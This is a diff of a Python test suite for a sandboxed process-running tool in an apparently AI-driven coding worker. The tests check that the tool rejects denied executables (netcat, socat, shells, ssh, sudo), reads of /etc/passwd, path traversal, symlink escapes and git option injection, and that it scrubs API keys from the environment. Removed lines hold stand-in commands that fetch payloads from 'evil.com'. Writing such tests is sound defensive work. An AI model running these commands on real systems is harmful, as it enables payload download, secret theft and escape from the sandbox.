@@ -82,43 +82,135 @@ def test_search_files_confined(repo):
     assert "error" in res.lower() or "rejected" in res.lower()
 
 
-@pytest.mark.parametrize("cmd", [
-    "git push origin main",
-    "git push",
-    "git remote add origin http://evil.com",
-    "git remote set-url origin http://evil.com",
-    "gh auth login",
-    "sudo apt install",
-    "systemctl restart service",
-    "service nginx restart",
-    "ssh user@remote",
-    "scp file remote:",
-    "curl -O http://evil.com/payload",
-    "wget http://evil.com/payload",
-    "nc -l 8080",
-    "docker run ubuntu",
-    "kubectl get pods",
-    "terraform apply",
+@pytest.mark.parametrize("executable,args", [
+    ("env", []),
+    ("printenv", []),
+    ("sh", ["-c", "id"]),
+    ("bash", ["-c", "id"]),
+    ("zsh", ["-c", "id"]),
+    ("perl", ["-e", "print 1"]),
+    ("ruby", ["-e", "puts 1"]),
+    ("node", ["-e", "console.log(1)"]),
+    ("curl", ["http://127.0.0.1"]),
+    ("wget", ["http://127.0.0.1"]),
+    ("nc", ["-l", "8080"]),
+    ("netcat", ["-l", "8080"]),
+    ("socat", ["-", "-"]),
+    ("ssh", ["user@remote"]),
+    ("scp", ["file", "remote:"]),
+    ("sftp", ["remote:"]),
+    ("gh", ["auth", "status"]),
+    ("sudo", ["whoami"]),
+    ("docker", ["ps"]),
+    ("kubectl", ["get", "pods"]),
+    ("terraform", ["apply"]),
+    ("ansible", ["all", "-m", "ping"]),
 ])
-def test_process_tool_rejects_unsafe_commands(repo, cmd):
-    res = run_process(repo, cmd, task="normal task")
-    assert "rejected" in res.lower() or "not permitted" in res.lower() or "forbidden" in res.lower()
+def test_process_tool_rejects_disallowed_executables(repo, executable, args):
+    res = run_process(repo, executable, args, task="normal task")
+    assert "rejected" in res.lower() or "not permitted" in res.lower() or "forbidden" in res.lower() or "error" in res.lower()
+
+
+@pytest.mark.parametrize("executable,args", [
+    ("python", ["-c", "import os; print(os.environ)"]),
+    ("python3", ["-c", "import sys; sys.exit(0)"]),
+    ("python", ["-m", "http.server"]),
+    ("python", ["-m", "pip", "install", "foo"]),
+])
+def test_process_tool_rejects_inline_code_and_arbitrary_modules(repo, executable, args):
+    res = run_process(repo, executable, args, task="normal task")
+    assert "rejected" in res.lower() or "not permitted" in res.lower() or "forbidden" in res.lower() or "error" in res.lower()
+
+
+def test_process_tool_rejects_path_escapes_and_symlinks(repo):
+    outside_file = repo.parent / "outside_secret.py"
+    outside_file.write_text("print('outside')", encoding="utf-8")
+    symlink_outside = repo / "sym_outside.py"
+    if not symlink_outside.exists():
+        os.symlink(outside_file, symlink_outside)
+
+    # Absolute path rejected
+    res = run_process(repo, "python", ["/etc/passwd"])
+    assert "rejected" in res.lower() or "escapes" in res.lower() or "error" in res.lower()
+
+    # Traversal rejected
+    res = run_process(repo, "python", ["../outside_secret.py"])
+    assert "rejected" in res.lower() or "traversal" in res.lower() or "error" in res.lower()
+
+    # Symlink escape rejected
+    res = run_process(repo, "python", ["sym_outside.py"])
+    assert "rejected" in res.lower() or "escapes" in res.lower() or "error" in res.lower()
+
+    # Pytest path escapes rejected
+    res = run_process(repo, "pytest", ["/etc/passwd"])
+    assert "rejected" in res.lower() or "error" in res.lower()
+    res = run_process(repo, "pytest", ["../outside_secret.py"])
+    assert "rejected" in res.lower() or "error" in res.lower()
+
+    # Git path escapes rejected
+    res = run_process(repo, "git", ["diff", "/etc/passwd"])
+    assert "rejected" in res.lower() or "error" in res.lower()
+    res = run_process(repo, "git", ["add", "/etc/passwd"], task="commit changes")
+    assert "rejected" in res.lower() or "error" in res.lower()
+
+
+def test_process_tool_rejects_unknown_options(repo):
+    res = run_process(repo, "git", ["--exec-path=/tmp"])
+    assert "rejected" in res.lower() or "not permitted" in res.lower() or "error" in res.lower()
+    res = run_process(repo, "git", ["-c", "core.pager=cat", "status"])
+    assert "rejected" in res.lower() or "not permitted" in res.lower() or "error" in res.lower()
+    res = run_process(repo, "pytest", ["--override-ini=something"])
+    assert "rejected" in res.lower() or "not permitted" in res.lower() or "error" in res.lower()
 
 
 def test_process_tool_git_commit_constraints(repo):
     # When task does NOT ask for commit
-    res = run_process(repo, "git commit -m 'msg'", task="just fix bug")
+    res = run_process(repo, "git", ["commit", "-m", "msg"], task="just fix bug")
     assert "rejected" in res.lower() or "permitted only" in res.lower()
 
     # When task asks for commit
     task = "Fix the bug and commit your changes"
     # git status is allowed
-    status_res = run_process(repo, "git status", task=task)
+    status_res = run_process(repo, "git", ["status"], task=task)
     assert "rejected" not in status_res.lower()
 
     # git diff is allowed
-    diff_res = run_process(repo, "git diff", task=task)
+    diff_res = run_process(repo, "git", ["diff"], task=task)
     assert "rejected" not in diff_res.lower()
+
+    # Disallowed git subcommands rejected
+    push_res = run_process(repo, "git", ["push", "origin", "main"], task=task)
+    assert "rejected" in push_res.lower() or "not permitted" in push_res.lower()
+    remote_res = run_process(repo, "git", ["remote", "-v"], task=task)
+    assert "rejected" in remote_res.lower() or "not permitted" in remote_res.lower()
+
+
+def test_process_tool_scrubs_secret_environment(repo, monkeypatch):
+    secret_key = "sk-openrouter-secret-token-value-999"
+    ssh_conn = "192.168.1.100 45678 10.0.0.1 22"
+    bridge_secret = "dev-bridge-super-secret-key"
+    monkeypatch.setenv("OPENROUTER_API_KEY", secret_key)
+    monkeypatch.setenv("DEVELOPMENT_BRIDGE_OPENROUTER_API_KEY", secret_key)
+    monkeypatch.setenv("DEVELOPMENT_BRIDGE_SECRET", bridge_secret)
+    monkeypatch.setenv("SSH_CONNECTION", ssh_conn)
+
+    script = repo / "dump_env.py"
+    script.write_text(
+        "import os\n"
+        "for k, v in sorted(os.environ.items()):\n"
+        "    print(f'{k}={v}')\n",
+        encoding="utf-8",
+    )
+
+    res = run_process(repo, "python", ["dump_env.py"], task="inspect environment")
+    assert secret_key not in res
+    assert bridge_secret not in res
+    assert ssh_conn not in res
+    assert "OPENROUTER" not in res
+    assert "DEVELOPMENT_BRIDGE" not in res
+    assert "SSH_CONNECTION" not in res
+    assert "PATH=" in res
+
 
 
 def test_openrouter_worker_tool_loop_and_usage_aggregation(repo):
@@ -239,5 +331,112 @@ def test_openrouter_worker_hits_max_turns_limit(repo):
 
 
 def test_process_tool_timeout(repo):
-    res = run_process(repo, "sleep 5", task="test", timeout=0.01)
+    (repo / "sleep.py").write_text("import time\ntime.sleep(5)\n", encoding="utf-8")
+    res = run_process(repo, "python", ["sleep.py"], task="test", timeout=0.01)
     assert "timed out" in res.lower()
+
+
+def test_process_tool_runs_local_python_script(repo):
+    (repo / "hello.py").write_text("print('hello from local script')\n", encoding="utf-8")
+    res = run_process(repo, "python", ["hello.py"], task="run script")
+    assert "exit code: 0" in res
+    assert "hello from local script" in res
+
+
+def test_process_tool_runs_git_status_diff(repo):
+    import shutil
+    import subprocess
+    if (repo / ".git").exists():
+        shutil.rmtree(repo / ".git")
+    subprocess.run(["git", "init"], cwd=repo, check=True, capture_output=True)
+    subprocess.run(["git", "config", "user.email", "test@example.com"], cwd=repo, check=True, capture_output=True)
+    subprocess.run(["git", "config", "user.name", "Test"], cwd=repo, check=True, capture_output=True)
+
+    # git status
+    res = run_process(repo, "git", ["status", "--short"], task="check status")
+    assert "exit code: 0" in res
+
+    # git diff
+    res = run_process(repo, "git", ["diff"], task="check diff")
+    assert "exit code: 0" in res
+
+
+def test_openrouter_worker_structured_run_process_dispatch(repo):
+    worker = OpenRouterWorker(
+        repo_root=repo,
+        model="deepseek/deepseek-v4-flash-0731",
+        api_key="test-api-key",
+        task="run tests",
+    )
+    (repo / "test_simple.py").write_text("def test_ok(): pass\n", encoding="utf-8")
+    output = worker._execute_tool(
+        "run_process",
+        json.dumps({"executable": "python", "arguments": ["test_simple.py"]}),
+    )
+    assert "exit code: 0" in output
+
+
+def test_openrouter_worker_run_process_tool_schema():
+    from app.executors.openrouter_worker import TOOLS
+    tool = next(t for t in TOOLS if t["function"]["name"] == "run_process")
+    schema = tool["function"]["parameters"]
+    assert "executable" in schema["properties"]
+    assert "arguments" in schema["properties"]
+    assert "command" not in schema["properties"]
+    assert schema["required"] == ["executable"]
+
+
+def test_process_tool_runs_pytest_local_test(repo):
+    (repo / "tests").mkdir(exist_ok=True)
+    (repo / "tests" / "test_dummy.py").write_text("def test_ok(): assert 1 == 1\n", encoding="utf-8")
+    res = run_process(repo, "pytest", ["-q", "tests/test_dummy.py"], task="run tests")
+    assert "exit code: 0" in res
+    assert "1 passed" in res
+
+
+def test_process_tool_git_add_and_commit_when_authorized(repo):
+    import shutil
+    import subprocess
+    if (repo / ".git").exists():
+        shutil.rmtree(repo / ".git")
+    subprocess.run(["git", "init"], cwd=repo, check=True, capture_output=True)
+    subprocess.run(["git", "config", "user.email", "test@example.com"], cwd=repo, check=True, capture_output=True)
+    subprocess.run(["git", "config", "user.name", "Test"], cwd=repo, check=True, capture_output=True)
+
+    (repo / "new_code.py").write_text("x = 42\n", encoding="utf-8")
+    task = "Implement feature and commit changes"
+
+    # Git add
+    add_res = run_process(repo, "git", ["add", "new_code.py"], task=task)
+    assert "exit code: 0" in add_res
+
+    # Git commit
+    commit_res = run_process(repo, "git", ["commit", "-m", "add new code"], task=task)
+    assert "exit code: 0" in commit_res
+
+
+def test_process_tool_rejects_invalid_executable_and_args(repo):
+    res_empty = run_process(repo, "")
+    assert "error" in res_empty.lower() or "rejected" in res_empty.lower()
+
+    res_spaces = run_process(repo, "git status")
+    assert "error" in res_spaces.lower() or "rejected" in res_spaces.lower()
+
+    res_bad_type = run_process(repo, "pytest", arguments=123)  # type: ignore
+    assert "error" in res_bad_type.lower() or "rejected" in res_bad_type.lower()
+
+
+def test_process_tool_rejects_symlink_escape_across_all_tools(repo):
+    outside_file = repo.parent / "ext_secret.py"
+    outside_file.write_text("secret = 1\n", encoding="utf-8")
+    symlink_file = repo / "sym_ext.py"
+    if not symlink_file.exists():
+        os.symlink(outside_file, symlink_file)
+
+    # Git add symlink escaping repo
+    res_git = run_process(repo, "git", ["add", "sym_ext.py"], task="commit")
+    assert "rejected" in res_git.lower() or "escapes" in res_git.lower() or "error" in res_git.lower()
+
+    # Pytest target symlink escaping repo
+    res_pytest = run_process(repo, "pytest", ["sym_ext.py"])
+    assert "rejected" in res_pytest.lower() or "escapes" in res_pytest.lower() or "error" in res_pytest.lower()
